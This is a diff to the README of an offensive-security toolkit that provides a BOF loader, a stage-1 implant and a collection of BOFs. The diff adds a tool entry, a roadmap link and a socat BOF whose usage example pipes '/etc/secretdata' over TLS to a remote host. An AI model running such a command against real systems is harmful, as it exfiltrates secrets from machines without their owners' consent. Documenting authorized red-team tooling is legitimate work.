@@ -9,8 +9,11 @@ The repository provides:
 1. [bof-launcher](#bof-launcher-library) - programming library for BOFs in-memory management (loading, keeping track of loaded BOFs, execution, masking).
 2. [z-beac0n](#z-beac0n) - a custom-written stage-1 (aka pre-C2) solution featuring bof-launcher. Engineered with a small footprint, stealth and modularity in mind.
 3. [Z-Labs BOFs collection](#z-Labs-bofs-collection) - growing collection of OS-specific and cross-platform BOFs for usage during a red team engagements.
+4. [cli4bofs](examples/cli4bofs) - a swiss army knife tool for running, injecting and organizing your BOFs collection.
 
-See [here](#building-all-components) for bulding instructions.
+See [here](ROADMAP.md) for project's roadmap.
+
+See [here](#building-all-components) for building instructions.
 
 # bof-launcher library
 
@@ -130,6 +133,7 @@ This is an open source project meant to be used with authorization to assess the
 | [uptime](bofs/src/coreutils/uptime.zig) | show how long the system has been running | `Linux x86/x86_64/ARMv6+/AArch64` | `uptime` |
 | [who](bofs/src/coreutils/who.zig) | print currently logged in users | `Linux x86/x86_64/ARMv6+/AArch64` | `who` |
 | [ifconfig](bofs/src/net-tools/ifconfig.zig) | Display the status of the currently active network interfaces. With root privileges: also manipulate current state of the device | `Linux x86/x86_64/ARMv6+/AArch64` | `ifconfig eth0 promisc` |
+| [socat](bofs/src/socat.zig) | Arbitrary TCP and TLS connections | `Linux x86/x86_64/ARMv6+/AArch64` | `socat OPEN:/etc/secretdata TLS:remotehost:8443` |
 
 ## Windows-only BOFs
 
